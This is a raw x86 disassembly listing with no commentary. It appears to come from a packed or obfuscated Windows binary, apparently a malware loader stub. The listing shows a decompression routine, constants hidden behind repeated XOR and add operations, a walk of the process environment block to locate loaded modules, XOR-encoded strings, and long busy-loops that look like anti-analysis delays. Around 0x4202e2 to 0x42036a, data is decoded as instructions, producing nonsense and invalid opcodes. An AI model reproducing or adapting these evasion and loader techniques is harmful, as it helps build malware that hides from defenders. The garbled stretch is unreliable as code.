  4200d3:	mov    al,0xf1
  4200d5:	dec    al
  4200d7:	call   0x4202f1
  4200dc:	jne    0x420131
  4200de:	pop    eax
  4200df:	cmp    al,0x7
  4200e1:	mov    al,0x9
  4200e3:	jb     0x4200e7
  4200e5:	mov    al,0xb
  4200e7:	push   eax
  4200e8:	mov    esi,DWORD PTR [ebp-0x4]
  4200eb:	sub    esi,DWORD PTR [ebp-0x24]
  4200ee:	cmp    esi,DWORD PTR [ebp+0x24]
  4200f1:	jb     0x4202c8
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	mov    edi,DWORD PTR [ebp-0x4]
  4200fb:	stos   BYTE PTR es:[edi],al
  4200fc:	jmp    0x42028f
  420101:	mov    al,0xd8
  420103:	call   0x420301
  420108:	mov    esi,DWORD PTR [ebp-0x28]
  42010b:	je     0x420128
  42010d:	mov    al,0xe4
  42010f:	call   0x420301
  420114:	mov    esi,DWORD PTR [ebp-0x2c]
  420117:	je     0x420122
  420119:	mov    esi,DWORD PTR [ebp-0x30]
  42011c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42011f:	mov    DWORD PTR [ebp-0x30],ecx
  420122:	mov    ecx,DWORD PTR [ebp-0x28]
  420125:	mov    DWORD PTR [ebp-0x2c],ecx
  420128:	mov    ecx,DWORD PTR [ebp-0x24]
  42012b:	mov    DWORD PTR [ebp-0x28],ecx
  42012e:	mov    DWORD PTR [ebp-0x24],esi
  420131:	pop    eax
  420132:	pop    edi
  420133:	pop    ecx
  420134:	mov    edx,0xa68
  420139:	mov    cl,0x8
  42013b:	add    edx,edi
  42013d:	push   edx
  42013e:	push   edi
  42013f:	cmp    al,0x7
  420141:	mov    al,cl
  420143:	jb     0x420147
  420145:	add    al,0x3
  420147:	push   eax
  420148:	mov    ebp,DWORD PTR [ebp-0x34]
  42014b:	call   0x42030e
  420150:	jne    0x420166
  420152:	mov    eax,DWORD PTR [ebp-0x18]
  420155:	mov    edi,DWORD PTR [ebp-0x34]
  420158:	shl    eax,0x3
  42015b:	sub    ecx,ecx
  42015d:	push   0x8
  42015f:	pop    esi
  420160:	lea    edi,[edi+eax*2+0x4]
  420164:	jmp    0x42019b
  420166:	mov    ebp,DWORD PTR [ebp-0x34]
  420169:	add    ebp,0x2
  42016c:	call   0x42030e
  420171:	jne    0x42018b
  420173:	mov    eax,DWORD PTR [ebp-0x18]
  420176:	mov    edi,DWORD PTR [ebp-0x34]
  420179:	shl    eax,0x3
  42017c:	push   0x8
  42017e:	pop    ecx
  42017f:	push   0x8
  420181:	pop    esi
  420182:	lea    edi,[edi+eax*2+0x104]
  420189:	jmp    0x42019b
  42018b:	mov    edi,0x204
  420190:	add    edi,DWORD PTR [ebp-0x34]
  420193:	push   0x10
  420195:	pop    ecx
  420196:	mov    esi,0x100
  42019b:	mov    DWORD PTR [ebp-0x1c],ecx
  42019e:	sub    eax,eax
  4201a0:	inc    eax
  4201a1:	mov    ebp,edi
  4201a3:	call   0x420310
  4201a8:	mov    ecx,eax
  4201aa:	sub    ecx,esi
  4201ac:	jb     0x4201a1
  4201ae:	add    DWORD PTR [ebp-0x1c],ecx
  4201b1:	cmp    DWORD PTR [ebp-0x3c],0x4
  4201b5:	jae    0x42026b
  4201bb:	add    DWORD PTR [ebp-0x3c],0x7
  4201bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4201c2:	cmp    ecx,0x4
  4201c5:	jb     0x4201ca
  4201c7:	push   0x3
  4201c9:	pop    ecx
  4201ca:	mov    edi,DWORD PTR [ebp-0x38]
  4201cd:	shl    ecx,0x6
  4201d0:	sub    eax,eax
  4201d2:	inc    eax
  4201d3:	push   0x40
  4201d5:	pop    esi
  4201d6:	lea    edi,[edi+ecx*2+0x360]
  4201dd:	mov    ebp,edi
  4201df:	call   0x420310
  4201e4:	mov    ecx,eax
  4201e6:	sub    ecx,esi
  4201e8:	jb     0x4201dd
  4201ea:	mov    DWORD PTR [ebp-0x18],ecx
  4201ed:	mov    DWORD PTR [ebp-0x24],ecx
  4201f0:	cmp    ecx,0x4
  4201f3:	jb     0x420268
  4201f5:	mov    esi,ecx
  4201f7:	and    DWORD PTR [ebp-0x24],0x1
  4201fb:	shr    esi,1
  4201fd:	or     DWORD PTR [ebp-0x24],0x2
  420201:	dec    esi
  420202:	cmp    ecx,0xe
  420205:	jae    0x420220
  420207:	mov    eax,0x2af
  42020c:	sub    eax,ecx
  42020e:	mov    ecx,esi
  420210:	shl    BYTE PTR [ebp-0x24],cl
  420213:	add    eax,DWORD PTR [ebp-0x24]
  420216:	shl    eax,1
  420218:	add    eax,DWORD PTR [ebp-0x38]
  42021b:	mov    DWORD PTR [ebp-0x34],eax
  42021e:	jmp    0x42024d
  420220:	sub    esi,0x4
  420223:	call   0x4202cd
  420228:	shr    ebx,1
  42022a:	shl    DWORD PTR [ebp-0x24],1
  42022d:	cmp    DWORD PTR [ebp-0x20],ebx
  420230:	jb     0x420238
  420232:	inc    DWORD PTR [ebp-0x24]
  420235:	sub    DWORD PTR [ebp-0x20],ebx
  420238:	dec    esi
  420239:	jne    0x420223
  42023b:	mov    eax,0x644
  420240:	add    eax,DWORD PTR [ebp-0x38]
  420243:	mov    DWORD PTR [ebp-0x34],eax
  420246:	shl    DWORD PTR [ebp-0x24],0x4
  42024a:	push   0x4
  42024c:	pop    esi
  42024d:	sub    edi,edi
  42024f:	inc    edi
  420250:	mov    eax,edi
  420252:	mov    ebp,DWORD PTR [ebp-0x34]
  420255:	call   0x420310
  42025a:	test   al,0x1
  42025c:	je     0x420261
  42025e:	or     DWORD PTR [ebp-0x24],edi
  420261:	shl    edi,1
  420263:	dec    esi
  420264:	jne    0x420252
  420266:	jmp    0x420268
  420268:	inc    DWORD PTR [ebp-0x24]
  42026b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42026e:	add    ecx,0x2
  420271:	mov    edi,DWORD PTR [ebp-0x4]
  420274:	mov    eax,edi
  420276:	sub    eax,DWORD PTR [ebp+0x24]
  420279:	cmp    DWORD PTR [ebp-0x24],eax
  42027c:	ja     0x4202c8
  42027e:	mov    esi,edi
  420280:	sub    esi,DWORD PTR [ebp-0x24]
  420283:	mov    edx,DWORD PTR [ebp+0x28]
  420286:	lods   al,BYTE PTR ds:[esi]
  420287:	stos   BYTE PTR es:[edi],al
  420288:	cmp    edi,edx
  42028a:	jae    0x42028f
  42028c:	dec    ecx
  42028d:	jne    0x420286
  42028f:	mov    DWORD PTR [ebp-0x4],edi
  420292:	movzx  esi,al
  420295:	cmp    edi,DWORD PTR [ebp+0x28]
  420298:	jb     0x41fff9
  42029e:	call   0x4202cd
  4202a3:	sub    eax,eax
  4202a5:	lea    ebp,[esp+0x3c]
  4202a9:	mov    edx,DWORD PTR [ebp+0x20]
  4202ac:	mov    esi,DWORD PTR [ebp-0x8]
  4202af:	sub    esi,DWORD PTR [ebp+0x18]
  4202b2:	mov    DWORD PTR [edx],esi
  4202b4:	mov    edx,DWORD PTR [ebp+0x2c]
  4202b7:	mov    edi,DWORD PTR [ebp-0x4]
  4202ba:	sub    edi,DWORD PTR [ebp+0x24]
  4202bd:	mov    DWORD PTR [edx],edi
  4202bf:	leave  
  4202c0:	pop    ebx
  4202c1:	pop    esi
  4202c2:	pop    edi
  4202c3:	ret    0x1c
  4202c6:	pop    esi
  4202c7:	pop    eax
  4202c8:	sub    eax,eax
  4202ca:	inc    eax
  4202cb:	jmp    0x4202a5
  4202cd:	cmp    ebx,0x1000000
  4202d3:	jb     0x4202d6
  4202d5:	ret    
  4202d6:	shl    ebx,0x8
  4202d9:	push   esi
  4202da:	mov    esi,DWORD PTR [ebp-0x8]
  4202dd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4202e0:	jae    0x4202c6
  4202e2:	mov    ecx,0xe920ea0
  4202e7:	stos   DWORD PTR es:[edi],eax
  4202e8:	cmp    eax,0xb10ea0b1
  4202ed:	pusha  
  4202ee:	outs   dx,BYTE PTR ds:[esi]
  4202ef:	add    al,0x9a
  4202f1:	mov    ecx,0x65c79ec0
  4202f6:	mov    ss,WORD PTR [edx-0x5f6864ee]
  4202fc:	cs xchg edi,eax
  4202fe:	xchg   edx,eax
  4202ff:	cmp    ah,BYTE PTR [ebx-0x68719a39]
  420305:	mov    al,ds:0xae40b99e
  42030a:	sar    DWORD PTR [eax+eiz*4],0x8b
  42030e:	aaa    
  42030f:	mov    es,ecx
  420311:	cmp    al,0xa0
  420313:	mov    edx,DWORD PTR [ecx-0x74747486]
  420319:	(bad)  
  42031a:	pop    eax
  42031b:	sti    
  42031c:	mov    ecx,0x926b1bbc
  420321:	sbb    al,0x1b
  420323:	or     ebp,DWORD PTR [ebx-0x3e44389]
  420329:	pop    eax
  42032a:	std    
  42032b:	mov    ch,0xcf
  42032d:	mov    bl,BYTE PTR [ebx+ebx*1-0x54e56d95]
  420334:	lods   eax,DWORD PTR ds:[esi]
  420335:	fcomp  QWORD PTR [ebx]
  420337:	or     edi,DWORD PTR [ecx-0x1f963846]
  42033d:	mov    edx,DWORD PTR [edx+0x49c7b732]
  420343:	mov    dh,0x6f
  420345:	mov    esp,0xe7580b1b
  42034a:	mov    ecx,0xab8b71f2
  42034f:	mov    ecx,DWORD PTR [ebx+0x3292b637]
  420355:	lahf   
  420356:	and    al,0x8f
  420358:	ror    BYTE PTR [ebx+0x3cc18e97],0x1b
  42035f:	mov    WORD PTR [edx+0x29053692],ds
  420365:	dec    esp
  420366:	and    al,0x20
  420368:	sub    ebx,ecx
  42036a:	sub    WORD PTR [ebp+0x0],dx
  42036e:	add    eax,eax
  420370:	add    eax,0x1
  420373:	lea    ebp,[esp+0x40]
  420377:	ret    
  420378:	push   ebp
  420379:	mov    ebp,esp
  42037b:	sub    esp,0x12c
  420381:	push   ebx
  420382:	push   esi
  420383:	push   edi
  420384:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42038b:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  420392:	mov    eax,DWORD PTR [ebp+0x8]
  420395:	mov    DWORD PTR [ebp+0x8],eax
  420398:	mov    ecx,DWORD PTR [ebp-0x10]
  42039b:	mov    ebx,0x75108b3
  4203a0:	xor    ecx,ebx
  4203a2:	mov    eax,0x3272fa
  4203a7:	add    ecx,eax
  4203a9:	mov    DWORD PTR [ebp-0x2c],ecx
  4203ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4203af:	xor    ecx,ebx
  4203b1:	add    ecx,eax
  4203b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4203b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4203b9:	xor    ecx,ebx
  4203bb:	add    ecx,eax
  4203bd:	mov    DWORD PTR [ebp-0x40],ecx
  4203c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4203c3:	xor    ecx,ebx
  4203c5:	add    ecx,eax
  4203c7:	mov    DWORD PTR [ebp-0xd8],ecx
  4203cd:	mov    DWORD PTR [ebp-0x50],0xf89f05b5
  4203d4:	mov    DWORD PTR [ebp-0x40],0xf89cb5b5
  4203db:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  4203e2:	push   0x25
  4203e4:	pop    ecx
  4203e5:	mov    DWORD PTR [ebp-0x38],ecx
  4203e8:	mov    DWORD PTR [ebp-0x38],ecx
  4203eb:	push   0x65
  4203ed:	pop    ecx
  4203ee:	mov    DWORD PTR [ebp-0x38],ecx
  4203f1:	mov    DWORD PTR [ebp-0x38],ecx
  4203f4:	mov    DWORD PTR [ebp-0x38],0x4d
  4203fb:	mov    DWORD PTR [ebp-0x38],0x43
  420402:	mov    ecx,DWORD PTR [ebp-0x10]
  420405:	xor    ecx,ebx
  420407:	add    ecx,eax
  420409:	mov    DWORD PTR [ebp-0x38],ecx
  42040c:	mov    ecx,DWORD PTR [ebp-0x10]
  42040f:	xor    ecx,ebx
  420411:	add    ecx,eax
  420413:	mov    DWORD PTR [ebp-0x38],ecx
  420416:	mov    DWORD PTR [ebp-0x28],0x258
  42041d:	mov    DWORD PTR [ebp-0x20],0x36
  420424:	mov    DWORD PTR [ebp-0x14],0x7a
  42042b:	lea    edi,[ebp-0x10c]
  420431:	lea    esi,[ebp-0x12c]
  420437:	call   0x4210f9
  42043c:	dec    DWORD PTR [ebp-0x14]
  42043f:	jne    0x42042b
  420441:	dec    DWORD PTR [ebp-0x20]
  420444:	jne    0x420424
  420446:	dec    DWORD PTR [ebp-0x28]
  420449:	jne    0x42041d
  42044b:	mov    DWORD PTR [ebp-0x28],0x400e
  420452:	mov    eax,DWORD PTR [ebp-0x10]
  420455:	xor    eax,ebx
  420457:	mov    esi,0x3272fa
  42045c:	add    eax,esi
  42045e:	mov    DWORD PTR [ebp-0x1c],eax
  420461:	mov    eax,DWORD PTR [ebp-0x10]
  420464:	and    DWORD PTR [ebp-0x94],0x0
  42046b:	xor    eax,ebx
  42046d:	add    eax,esi
  42046f:	mov    DWORD PTR [ebp-0x34],eax
  420472:	mov    eax,fs:0x18
  420478:	mov    DWORD PTR [ebp-0x94],eax
  42047e:	mov    eax,DWORD PTR [eax+0x30]
  420481:	mov    DWORD PTR [ebp-0xcc],eax
  420487:	mov    eax,DWORD PTR [eax+0xc]
  42048a:	mov    DWORD PTR [ebp-0xc0],eax
  420490:	mov    eax,DWORD PTR [ebp+0x8]
  420493:	lea    ecx,[ebp-0x94]
  420499:	mov    DWORD PTR [eax+0x1a0],ecx
  42049f:	mov    eax,DWORD PTR [ebp+0x8]
  4204a2:	lea    ecx,[ebp-0xcc]
  4204a8:	mov    DWORD PTR [eax+0x1a4],ecx
  4204ae:	mov    eax,DWORD PTR [ebp+0x8]
  4204b1:	push   DWORD PTR [ebp+0x8]
  4204b4:	lea    ecx,[ebp-0xc0]
  4204ba:	mov    DWORD PTR [eax+0x1a8],ecx
  4204c0:	call   0x4228ba
  4204c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4204c8:	xor    ecx,ebx
  4204ca:	add    ecx,esi
  4204cc:	cmp    ecx,eax
  4204ce:	je     0x420851
  4204d4:	mov    eax,DWORD PTR [ebp+0x8]
  4204d7:	mov    eax,DWORD PTR [eax+0x194]
  4204dd:	mov    ecx,DWORD PTR [eax]
  4204df:	mov    eax,DWORD PTR [ebp+0x8]
  4204e2:	mov    eax,DWORD PTR [eax+0x194]
  4204e8:	mov    eax,DWORD PTR [eax]
  4204ea:	add    eax,DWORD PTR [ecx+0x3c]
  4204ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4204f0:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4204f6:	lea    edx,[ebp-0xec]
  4204fc:	push   edx
  4204fd:	mov    edx,DWORD PTR [ebp+0x8]
  420500:	mov    edx,DWORD PTR [edx+0x18c]
  420506:	mov    edx,DWORD PTR [edx]
  420508:	add    edx,DWORD PTR [eax+0x88]
  42050e:	push   0x4
  420510:	push   DWORD PTR [eax+0x8c]
  420516:	push   edx
  420517:	call   DWORD PTR [ecx+0x1c]
  42051a:	push   DWORD PTR [ebp+0x8]
  42051d:	xor    eax,eax
  42051f:	mov    DWORD PTR [ebp-0xa8],0xe3bcecc2
  420529:	mov    DWORD PTR [ebp-0xa4],0xe8c7edda
  420533:	mov    DWORD PTR [ebp-0xa0],0xbaeddef0
  42053d:	mov    BYTE PTR [ebp-0x9c],0x7b
  420544:	lea    edi,[ebp-0x9b]
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	stos   WORD PTR es:[edi],ax
  42054d:	stos   BYTE PTR es:[edi],al
  42054e:	xor    eax,eax
  420550:	mov    DWORD PTR [ebp-0xbc],0xe3bcecc2
  42055a:	mov    DWORD PTR [ebp-0xb8],0xe8c7edda
  420564:	mov    DWORD PTR [ebp-0xb4],0xd0eddef0
  42056e:	mov    BYTE PTR [ebp-0xb0],0x7b
  420575:	lea    edi,[ebp-0xaf]
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	stos   WORD PTR es:[edi],ax
  42057e:	stos   BYTE PTR es:[edi],al
  42057f:	mov    edi,DWORD PTR [ebp+0x8]
  420582:	mov    eax,DWORD PTR [ebp+0x8]
  420585:	mov    edx,DWORD PTR [eax+0x1b8]
  42058b:	mov    DWORD PTR [ebp-0x68],0xedefece7
  420592:	mov    DWORD PTR [ebp-0x64],0xe2ebe6dc
  420599:	mov    WORD PTR [ebp-0x60],0x7bba
  42059f:	mov    DWORD PTR [ebp-0x90],0xe3bcecc2
  4205a9:	mov    DWORD PTR [ebp-0x8c],0xe7baedda
  4205b3:	mov    DWORD PTR [ebp-0x88],0xc9dae3eb
  4205bd:	mov    DWORD PTR [ebp-0x84],0xeddee6ee
  4205c7:	mov    DWORD PTR [ebp-0x80],0x7bbadce2
  4205ce:	mov    DWORD PTR [ebp-0x7c],0xe3bcecc2
  4205d5:	mov    DWORD PTR [ebp-0x78],0xe7baedda
  4205dc:	mov    DWORD PTR [ebp-0x74],0xc9dae3eb
  4205e3:	mov    DWORD PTR [ebp-0x70],0xeddee6ee
  4205ea:	mov    DWORD PTR [ebp-0x6c],0x7bd0dce2
  4205f1:	call   0x4228e9
  4205f6:	push   eax
  4205f7:	mov    eax,DWORD PTR [ebp+0x8]
  4205fa:	mov    eax,DWORD PTR [eax+0x1a8]
  420600:	push   DWORD PTR [eax]
  420602:	call   0x42258a
  420607:	test   eax,eax
  420609:	jne    0x42065b
  42060b:	mov    eax,DWORD PTR [ebp+0x8]
  42060e:	mov    eax,DWORD PTR [eax+0x1e0]
  420614:	mov    edi,DWORD PTR [ebp+0x8]
  420617:	add    eax,0x4
  42061a:	mov    DWORD PTR [ebp-0x24],eax
  42061d:	mov    eax,DWORD PTR [ebp+0x8]
  420620:	mov    edx,DWORD PTR [eax+0x1b8]
  420626:	call   0x4228e9
  42062b:	push   eax
  42062c:	mov    eax,DWORD PTR [ebp-0x24]
  42062f:	call   DWORD PTR [eax]
  420631:	test   eax,eax
  420633:	jne    0x42065b
  420635:	mov    eax,DWORD PTR [ebp+0x8]
  420638:	mov    eax,DWORD PTR [eax+0x1e0]
  42063e:	mov    edi,DWORD PTR [ebp+0x8]
  420641:	add    eax,0x10
  420644:	mov    DWORD PTR [ebp-0x24],eax
  420647:	mov    eax,DWORD PTR [ebp+0x8]
  42064a:	mov    edx,DWORD PTR [eax+0x1b8]
  420650:	call   0x4228e9
  420655:	push   eax
  420656:	mov    eax,DWORD PTR [ebp-0x24]
  420659:	call   DWORD PTR [eax]
  42065b:	mov    eax,DWORD PTR [ebp-0x10]
  42065e:	mov    ecx,DWORD PTR [ebp-0x28]
  420661:	xor    eax,ebx
  420663:	add    eax,esi
  420665:	cmp    eax,ecx
  420667:	je     0x42082a
  42066d:	mov    eax,DWORD PTR [ebp-0x18]
  420670:	xor    eax,ebx
  420672:	mov    ecx,0xffcd8d06
  420677:	sub    ecx,eax
  420679:	add    ecx,DWORD PTR [ebp-0x28]
  42067c:	mov    eax,DWORD PTR [ebp-0x1c]
  42067f:	cmp    eax,ecx
  420681:	ja     0x42082a
  420687:	mov    DWORD PTR [ebp-0x20],0x0
  42068e:	push   DWORD PTR [ebp+0x8]
  420691:	mov    edi,DWORD PTR [ebp+0x8]
  420694:	mov    eax,DWORD PTR [ebp+0x8]
  420697:	mov    edx,DWORD PTR [eax+0x1b4]
  42069d:	call   0x4228e9
  4206a2:	push   eax
  4206a3:	mov    eax,DWORD PTR [ebp+0x8]
  4206a6:	mov    eax,DWORD PTR [eax+0x1a8]
  4206ac:	push   DWORD PTR [eax]
  4206ae:	call   0x42258a
  4206b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4206b6:	mov    ecx,DWORD PTR [ecx+0x19c]
  4206bc:	mov    DWORD PTR [ecx],eax
  4206be:	mov    eax,DWORD PTR [ebp+0x8]
  4206c1:	mov    edi,DWORD PTR [eax+0x1e0]
  4206c7:	mov    esi,DWORD PTR [ebp+0x8]
  4206ca:	xor    eax,eax
  4206cc:	lea    edx,[ebp-0x7c]
  4206cf:	call   0x42291f
  4206d4:	push   eax
  4206d5:	mov    eax,DWORD PTR [ebp+0x8]
  4206d8:	mov    eax,DWORD PTR [eax+0x19c]
  4206de:	push   DWORD PTR [eax]
  4206e0:	call   DWORD PTR [edi+0x8]
  4206e3:	mov    DWORD PTR [ebp-0x24],eax
  4206e6:	mov    eax,DWORD PTR [ebp+0x8]
  4206e9:	mov    edi,DWORD PTR [eax+0x1e0]
  4206ef:	mov    esi,DWORD PTR [ebp+0x8]
  4206f2:	xor    eax,eax
  4206f4:	lea    edx,[ebp-0x90]
  4206fa:	call   0x42291f
  4206ff:	push   eax
  420700:	mov    eax,DWORD PTR [ebp+0x8]
  420703:	mov    eax,DWORD PTR [eax+0x19c]
  420709:	push   DWORD PTR [eax]
  42070b:	call   DWORD PTR [edi+0x8]
  42070e:	mov    eax,DWORD PTR [ebp+0x8]
  420711:	mov    edi,DWORD PTR [eax+0x1e0]
  420717:	mov    esi,DWORD PTR [ebp+0x8]
  42071a:	xor    eax,eax
  42071c:	lea    edx,[ebp-0xa8]
  420722:	call   0x42291f
  420727:	push   eax
  420728:	mov    eax,DWORD PTR [ebp+0x8]
  42072b:	mov    eax,DWORD PTR [eax+0x19c]
  420731:	push   DWORD PTR [eax]
  420733:	call   DWORD PTR [edi+0x8]
  420736:	and    DWORD PTR [ebp-0x8],0x0
  42073a:	mov    DWORD PTR [ebp-0x44],eax
  42073d:	mov    eax,DWORD PTR [ebp-0x8]
  420740:	and    eax,0x7
  420743:	add    eax,0x31
  420746:	push   eax
  420747:	call   DWORD PTR [ebp-0x24]
  42074a:	test   eax,eax
  42074c:	je     0x420790
  42074e:	mov    eax,DWORD PTR [ebp-0x8]
  420751:	push   0x19
  420753:	xor    edx,edx
  420755:	pop    ecx
  420756:	div    ecx
  420758:	add    dl,0x41
  42075b:	movzx  eax,dl
  42075e:	push   eax
  42075f:	call   DWORD PTR [ebp-0x44]
  420762:	test   eax,eax
  420764:	jne    0x420790
  420766:	mov    eax,DWORD PTR [ebp+0x8]
  420769:	mov    edi,DWORD PTR [eax+0x1e0]
  42076f:	mov    esi,DWORD PTR [ebp+0x8]
  420772:	xor    eax,eax
  420774:	lea    edx,[ebp-0x68]
  420777:	call   0x42291f
  42077c:	push   eax
  42077d:	mov    eax,DWORD PTR [ebp+0x8]
  420780:	mov    eax,DWORD PTR [eax+0x198]
  420786:	push   DWORD PTR [eax]
  420788:	call   DWORD PTR [edi+0x8]
  42078b:	mov    DWORD PTR [ebp-0x14],eax
  42078e:	jmp    0x420794
  420790:	and    DWORD PTR [ebp-0x14],0x0
  420794:	inc    DWORD PTR [ebp-0x8]
  420797:	cmp    DWORD PTR [ebp-0x8],0x10
  42079b:	jb     0x42073d
  42079d:	mov    eax,DWORD PTR [ebp-0x18]
  4207a0:	mov    esi,DWORD PTR [ebp+0x8]
  4207a3:	xor    eax,ebx
  4207a5:	mov    edi,0x3272fa
  4207aa:	add    eax,edi
  4207ac:	lea    edx,[ebp-0x10c]
  4207b2:	call   0x42291f
  4207b7:	push   eax
  4207b8:	mov    eax,DWORD PTR [ebp-0x10]
  4207bb:	mov    esi,DWORD PTR [ebp+0x8]
  4207be:	xor    eax,ebx
  4207c0:	add    eax,edi
  4207c2:	lea    edx,[ebp-0x12c]
  4207c8:	call   0x42291f
  4207cd:	push   eax
  4207ce:	call   DWORD PTR [ebp-0x14]
  4207d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4207d4:	xor    ecx,ebx
  4207d6:	add    ecx,edi
  4207d8:	cmp    ecx,eax
  4207da:	jne    0x4207e3
  4207dc:	mov    DWORD PTR [ebp-0x20],0x1
  4207e3:	mov    eax,DWORD PTR [ebp-0x18]
  4207e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4207e9:	xor    eax,ebx
  4207eb:	lea    eax,[eax+ecx*1+0x3272fa]
  4207f2:	mov    DWORD PTR [ebp-0x1c],eax
  4207f5:	mov    eax,DWORD PTR [ebp-0x20]
  4207f8:	test   eax,eax
  4207fa:	je     0x42080e
  4207fc:	mov    eax,DWORD PTR [ebp-0x18]
  4207ff:	mov    ecx,DWORD PTR [ebp-0x34]
  420802:	xor    eax,ebx
  420804:	lea    eax,[eax+ecx*1+0x3272fa]
  42080b:	mov    DWORD PTR [ebp-0x34],eax
  42080e:	mov    eax,DWORD PTR [ebp-0x18]
  420811:	xor    eax,ebx
  420813:	mov    ecx,0xffcd8d06
  420818:	sub    ecx,eax
  42081a:	add    ecx,DWORD PTR [ebp-0x28]
  42081d:	mov    eax,DWORD PTR [ebp-0x1c]
  420820:	cmp    eax,ecx
  420822:	jbe    0x420687
  420828:	mov    esi,edi
  42082a:	mov    eax,DWORD PTR [ebp-0x34]
  42082d:	mov    ecx,DWORD PTR [ebp-0x1c]
  420830:	cmp    ecx,eax
  420832:	jne    0x420845
  420834:	push   DWORD PTR [ebp+0x8]
  420837:	lea    eax,[ebp-0x3c]
  42083a:	push   eax
  42083b:	call   0x42338e
  420840:	mov    DWORD PTR [ebp-0x2c],eax
  420843:	jmp    0x420851
  420845:	mov    eax,DWORD PTR [ebp-0x2c]
  420848:	mov    ecx,DWORD PTR [ebp-0x18]
  42084b:	xor    ecx,ebx
  42084d:	add    ecx,esi
  42084f:	xor    DWORD PTR [eax],ecx
  420851:	mov    eax,DWORD PTR [ebp-0x10]
  420854:	mov    ecx,DWORD PTR [ebp-0x2c]
  420857:	xor    eax,ebx
  420859:	add    eax,esi
  42085b:	cmp    eax,ecx
  42085d:	je     0x420fd7
  420863:	mov    eax,DWORD PTR [ebp-0x10]
  420866:	mov    ecx,DWORD PTR [ebp-0x3c]
  420869:	xor    eax,ebx
  42086b:	add    eax,esi
  42086d:	cmp    eax,ecx
  42086f:	je     0x420fd7
  420875:	mov    eax,DWORD PTR [ebp-0x10]
  420878:	xor    eax,ebx
  42087a:	add    eax,esi
  42087c:	jmp    0x42089a
  42087e:	mov    edi,DWORD PTR [ebp-0x2c]
  420881:	mov    cl,al
  420883:	and    cl,0x1f
  420886:	or     dl,0xff
  420889:	sub    dl,cl
  42088b:	add    BYTE PTR [edi+eax*1],dl
  42088e:	mov    ecx,DWORD PTR [ebp-0x18]
  420891:	xor    ecx,ebx
  420893:	lea    eax,[eax+ecx*1+0x3272fa]
  42089a:	mov    ecx,DWORD PTR [ebp-0x3c]
  42089d:	cmp    eax,ecx
  42089f:	jb     0x42087e
  4208a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4208a4:	mov    DWORD PTR [ebp-0x28],eax
  4208a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4208aa:	mov    DWORD PTR [ebp-0x34],0xf89c85b5
  4208b1:	mov    DWORD PTR [ebp-0xd4],eax
  4208b7:	mov    edi,0xf89c85b4
  4208bc:	mov    DWORD PTR [ebp-0x30],edi
  4208bf:	mov    eax,DWORD PTR [ebp-0x34]
  4208c2:	xor    eax,ebx
  4208c4:	add    eax,esi
  4208c6:	mov    DWORD PTR [ebp-0xc],eax
  4208c9:	mov    eax,DWORD PTR [ebp-0x34]
  4208cc:	xor    eax,ebx
  4208ce:	add    eax,esi
  4208d0:	mov    DWORD PTR [ebp-0x8],eax
  4208d3:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  4208da:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  4208e1:	mov    eax,DWORD PTR [ebp-0x34]
  4208e4:	mov    ecx,DWORD PTR [ebp-0x28]
  4208e7:	xor    eax,ebx
  4208e9:	add    eax,esi
  4208eb:	cmp    ecx,eax
  4208ed:	je     0x420aec
  4208f3:	jmp    0x420ac8
  4208f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4208fb:	mov    eax,DWORD PTR [ebp-0x28]
  4208fe:	sub    eax,ecx
  420900:	mov    ecx,DWORD PTR [ebp-0x44]
  420903:	xor    ecx,ebx
  420905:	add    ecx,esi
  420907:	xor    edx,edx
  420909:	div    ecx
  42090b:	mov    DWORD PTR [ebp-0x8],eax
  42090e:	mov    eax,DWORD PTR [ebp-0x4c]
  420911:	mov    ecx,DWORD PTR [ebp-0x8]
  420914:	xor    eax,ebx
  420916:	add    eax,esi
  420918:	cmp    ecx,eax
  42091a:	jbe    0x420926
  42091c:	mov    eax,DWORD PTR [ebp-0x4c]
  42091f:	xor    eax,ebx
  420921:	add    eax,esi
  420923:	mov    DWORD PTR [ebp-0x8],eax
  420926:	mov    eax,DWORD PTR [ebp-0x44]
  420929:	mov    ecx,DWORD PTR [ebp-0x8]
  42092c:	xor    eax,ebx
  42092e:	add    eax,esi
  420930:	imul   eax,ecx
  420933:	mov    DWORD PTR [ebp-0x8],eax
  420936:	mov    eax,DWORD PTR [ebp-0x34]
  420939:	mov    ecx,DWORD PTR [ebp-0x8]
  42093c:	xor    eax,ebx
  42093e:	add    eax,esi
  420940:	cmp    ecx,eax
  420942:	je     0x420ab6
  420948:	mov    eax,DWORD PTR [ebp-0x8]
  42094b:	mov    DWORD PTR [ebp-0x14],eax
  42094e:	mov    eax,DWORD PTR [ebp-0xc]
  420951:	add    eax,DWORD PTR [ebp-0xd4]
  420957:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  42095e:	mov    DWORD PTR [ebp-0x20],edi
  420961:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  42096b:	mov    DWORD PTR [ebp-0x8],eax
  42096e:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420975:	mov    DWORD PTR [ebp-0x1c],edi
  420978:	mov    eax,DWORD PTR [ebp-0x24]
  42097b:	xor    eax,ebx
  42097d:	add    eax,esi
  42097f:	jmp    0x420a75
  420984:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  42098e:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  420998:	mov    eax,DWORD PTR [ebp-0x1c]
